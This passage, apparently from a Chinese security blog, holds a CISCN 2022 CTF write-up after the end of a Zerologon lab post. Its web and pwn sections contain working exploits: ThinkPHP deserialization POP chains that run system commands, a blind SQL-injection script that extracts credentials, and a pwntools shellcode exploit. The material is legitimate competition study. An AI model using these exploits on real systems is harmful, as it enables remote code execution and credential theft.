href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><p>ä½¿ç”¨æ–¹æ³•:python reinstall_original_pw.py åŸŸæ§æœºå™¨å åŸŸæ§ip $MACHINE.ACCååŠéƒ¨åˆ†çš„å€¼</p><pre><code class="shell">python3 reinstall_original_pw.py ly-1 192.168.64.150 d6b706f6a4ea457327a4bfc1c4c642cb</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235319943.png" alt="image-20220713235319943"></p><p><strong>æµ‹è¯•æ˜¯å¦æ¢å¤æˆåŠŸ</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235714975.png" alt="image-20220713235714975"></p><p>æ­¤æ—¶ä½¿ç”¨ç©ºå¯†ç å»è·å–åŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯å·²ç»ä¸è¡Œäº†</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> å†…ç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2022</title>
      <link href="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/"/>
      <url>/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°:"></a>ç­¾åˆ°:</h2><p>æ ¹æ®å…¬ä¼—å·ç»™çš„æç¤ºï¼Œå¯æ„é€ å‡ºè„šæœ¬</p><pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;a=a[0:28]tmp=&#39;0&#39;b=&#39;1732251413440356045166710055&#39;for i in range(28):    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p><p>è®¿é—®url:</p><p>xxx/send?msg=s</p><p>å†è®¿é—®</p><p>xxx/send?msg=6275204973709393069208712710</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯1</h2><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯2</h2><p>éé¢„æœŸè§£:</p><p>è¿æ¥ssh</p><p>è¿›å…¥</p><p>/root/cube-shell/instance/flag_server ç›®å½•</p><p>ä¸¤ä¸ªflagå…¨åœ¨é‡Œé¢</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p><h2 id="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"><a href="#åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3" class="headerlink" title="åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3"></a>åŸºäºæŒ‘æˆ˜ç çš„åŒå‘è®¤è¯3</h2><p>éé¢„æœŸ</p><p>è¿æ¥ssh</p><p>è¿›å…¥</p><p>/root/cube-shell/instance/flag_server ç›®å½•</p><p>su root</p><p>å¼±å£ä»¤å¯†ç :toor</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h2><p>ç›´æ¥å¡«é—®å·å³å¯å¾—åˆ°flag</p><h2 id="é”®ç›˜æµé‡"><a href="#é”®ç›˜æµé‡" class="headerlink" title="é”®ç›˜æµé‡"></a>é”®ç›˜æµé‡</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json</code></pre><p>å¯¼å‡ºjsonæ•°æ®</p><p>ç»è¿‡åˆ†æï¼Œå®ƒæ˜¯æœ‰ä¸¤ä¸ªé”®ç›˜æµé‡ã€‚</p><p>åˆ†ç¦»ä¸€ä¸‹</p><pre><code>import jsonjsonData=&quot;&quot;with open(&quot;data.json&quot;) as f:    text=f.read()    jsonData=json.loads(text)data_1=&quot;&quot;data_2=&quot;&quot;for i in jsonData:    try:        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;        else:            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;    except:        passprint(data_1)print(data_2)</code></pre><p>åˆ†åˆ«ä¿å­˜ä¸º1.txt,2.txt</p><p>ä½¿ç”¨ç½‘ä¸Šç°æˆå¾—è„šæœ¬è¿›è¡Œæå–æ•°æ®</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;1.txt&#39;) //2.txtfor line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p><p>å‘ç°æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç¬¬äºŒä¸ªä¸ºå¯†ç </p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p><p>è§£å¼€å³å¯å¾—åˆ°flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>ä½¿ç”¨çš„</p><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p><p>exp:</p><pre><code class="php">&lt;?phpnamespace think&#123;    abstract class Model&#123;        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        function __construct($obj = &#39;&#39;)&#123;            $this-&gt;lazySave = True;            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];            $this-&gt;exists = True;            $this-&gt;table = $obj;            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];            $this-&gt;jsonAssoc = True;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;    &#125;&#125;namespace&#123;    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p><p>ls / æŸ¥çœ‹</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p><p>è¯»flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p><h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>wafè„šæœ¬å¦‚ä¸‹:</p><pre><code class="php">&lt;?phpfunction safe($a) &#123;    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);    return (string)$r;  &#125;?&gt;</code></pre><p>åœ¨æ¯”èµ›ä¸­æ˜¯æ²¡æœ‰ç»™å‡ºä»£ç çš„</p><p>è€ƒå¯Ÿsqlæ³¨å…¥ï¼Œå’Œ2022è™ç¬¦babysqlå¾ˆç›¸ä¼¼ã€‚</p><p>å¯åˆ©ç”¨case whenæ³¨å…¥ï¼Œå¯æ„é€ å‡ºpayload</p><pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;</code></pre><p>è¿‡æ»¤äº†å–åå¯¼è‡´ä¸èƒ½åˆ©ç”¨<del>0+1æ¥åˆ¶é€ æº¢å‡º,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ 18446744073709551615+1(å®ƒå°±ä»£è¡¨</del>0+1)æ¥åˆ¶é€ å‡ºæº¢å‡ºï¼Œå½“åŒ¹é…åˆ°æ­£ç¡®å­—ç¬¦æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠ¥500ï¼Œå¦åˆ™å°±è¿”å›â€™0â€™ï¼ŒæœåŠ¡å™¨ä¼šæŠ¥errorã€‚æˆ–è€…ç”¨9223372036854775807+1ä¹Ÿè¡Œ</p><p>ç”±æ­¤å¯æ„é€ å‡ºè„šæœ¬:</p><pre><code class="python">import requestsimport stringurl = &#39;http://1.14.71.254:28470/login.php&#39;result = &#39;&#39;ceshi = &#39;&#39;lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;gl = &quot;%*()_&quot;while 1:    for i in lis:            if i in gl:  # è¿™é‡Œæ˜¯å¯¹likeæ­£åˆ™åŒ¹é…ä¸­çš„ä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰                i = &quot;\\&quot; + i            ceshi = result + i            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)            #print(payload)            #username æ”¹ä¸º passwordå³å¯å¾—åˆ°å¯†ç             data = &#123;                &quot;username&quot;: &quot;666&quot;,                &quot;password&quot;: payload            &#125;            response = requests.post(url, data=data)            if response.status_code == 500:                print(&quot;success!&quot;)                result = result + i                res2 = result                print(res2.replace(&quot;\\&quot;,&quot;&quot;))                break            elif response.status_code == 0:                continue            else:                continue</code></pre><p>å¯å¾—åˆ°è´¦å·å¯†ç :</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p><pre><code>nssctfwabbybaboo!@$%!!PAssw40d_Y0u3_Never_Konwn!@!!</code></pre><p>è¿›å»åå¾—åˆ°ä¸€ä¸²ä¹±ç æ–‡ä»¶</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p><p>å‘ç°æ˜¯phpjiamiåŠ å¯†</p><p>githubæœ‰ç›¸åº”çš„å·¥å…·:<a href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p><p>ä½†æ˜¯å¦‚æœç›´æ¥å¤åˆ¶ç²˜è´´ä¸‹æ¥è§£å¯†å¤§éƒ¨åˆ†æƒ…å†µéƒ½ä¼šæ¼å­—ç¬¦ï¼Œè€Œphpjiamiè¿™é‡Œè§£å¯†ç›¸å¯¹æ¯”è¾ƒè‹›åˆ»ï¼Œå°‘ä¸€ä¸ªå­—ç¬¦éƒ½ä¼šè§£å¯†å¤±è´¥ï¼Œå¯ä»¥é‡‡ç”¨è„šæœ¬æŠŠæ··æ·†ä»£ç ä¿å­˜ä¸‹æ¥å†è§£å¯†ï¼ŒæŠŠurlå’Œcookieæ”¹æˆä½ çš„å°±å¯ä»¥äº†</p><pre><code class="php">&lt;?php$url =&quot;http://1.14.71.254:28470/login.php&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);$result = curl_exec($ch);curl_close($ch);echo urlencode($result);file_put_contents(&quot;pop.php&quot;,$result);?&gt;</code></pre><p>å°†ç”Ÿæˆçš„æ–‡ä»¶æ”¾å…¥è§£å¯†è„šæœ¬</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p><p>æœ€ç»ˆå¾—åˆ°ä¸€ä¸‹ä»£ç </p><pre><code class="php">&lt;?phpsession_start();if(!isset($_SESSION[&#39;login&#39;]))&#123;    die();&#125;function Al($classname)&#123;    include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#39;a&#39;]))&#123;    $c = $_REQUEST[&#39;a&#39;];    $o = unserialize($c);    if($o === false) &#123;        die(&quot;Error Format&quot;);    &#125;else&#123;        spl_autoload_register(&#39;Al&#39;);        $o = unserialize($c);        $raw = serialize($o);        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;            throw new Error(&quot;Error&quot;);        &#125;        $o = unserialize($raw);        var_dump($o);    &#125;&#125;else &#123;    echo file_get_contents(&quot;SomeClass.php&quot;);&#125;</code></pre><p>è®¿é—®:</p><pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php</code></pre><p>å¯å¾—åˆ°someclassçš„ä»£ç </p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? å“å¾—æˆ‘èµ¶ç´§æŠŠåé—¨æ³¨é‡Šäº†        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;?&gt;</code></pre><p>æ„é€ popé“¾ï¼Œè¿›è¡Œååºåˆ—åŒ–</p><p><strong>spl_autoload_registerçš„ä½œç”¨å°±æ˜¯æŠŠåé¢ååºåˆ—åŒ–ä¸å­˜åœ¨çš„ç±»æ‰€åœ¨çš„æ–‡ä»¶åŠ è½½è¿›æ¥</strong></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p><p>ç”±äºæ¼æ´ä»£ç åœ¨SomeClass.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p><p>æˆ‘ä»¬éœ€è¦è®©å®ƒåŒ…å«åç›´æ¥è¿›å…¥destructé­”æœ¯å‡½æ•°</p><p>å…³äºgcå›æ”¶æœºåˆ¶å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå†™çš„éå¸¸å¥½:<a href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p><p>popé“¾æ¡çš„æ€è·¯éå¸¸æ¸…æ™°ï¼š</p><pre><code>Eçš„destruct --&gt; B çš„toString --&gt; A(rceç‚¹)</code></pre><p>æœ€ç»ˆexp:</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? å“å¾—æˆ‘èµ¶ç´§æŠŠåé—¨æ³¨é‡Šäº†        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;class SomeClass&#123;    public $a;&#125;$a = new A();$b = new B();$e = new E();$e -&gt;a = $b; #dieå‡½æ•°ä¼šæŠŠ$bå½“ä½œå­—ç¬¦ä¸²è¾“å‡ºï¼Œä»è€Œè°ƒç”¨äº†toStringé­”æœ¯æ–¹æ³•$b -&gt;a = $a;$arr = new ArrayObject(); #åªè¦æ˜¯phpçš„åŸç”Ÿç±»å³å¯$arr -&gt; a = &quot;system&quot;;$arr -&gt; b = &quot;ls /&quot;;$a -&gt;b = $arr;$c = new SomeClass();$c -&gt;a =$e;echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))?&gt;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,ç¡®ä¿unk_202028å’Œunk_202024ä¸º1ï¼Œ</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p><p>case2:ï¼Œunk_202028å’Œunk_202028ä¸º1çš„æ—¶å€™æ‰§è¡Œå†™çš„shellcodeï¼Œshellcodeå¿…é¡»ä¸ºå¯è§å­—ç¬¦ï¼š</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p><p>ç”Ÿæˆshellcodeå¯è§å­—ç¬¦ä¸²ï¼š</p><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p><p>expï¼š</p><pre><code class="python">from pwn import*context.log_level = &quot;debug&quot;io = remote(&quot;123.56.111.202&quot;,17395)# io = process(&quot;./login&quot;)io.recv()shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;io.sendline(payload)payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;io.sendline(payload)io.interactive()</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swiftçš„ASTæ ‘</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p><p>å‚ç…§swiftcçš„è¾“å‡º</p><p>æ„é€ å‡ºè„šæœ¬</p><pre><code class="c">#include &lt;stdio.h&gt;unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;unsigned char k[] = &quot;345y&quot;;int main()&#123;    for (int i = 0; i &lt; 42 - 3; i++)    &#123;        unsigned char tmp 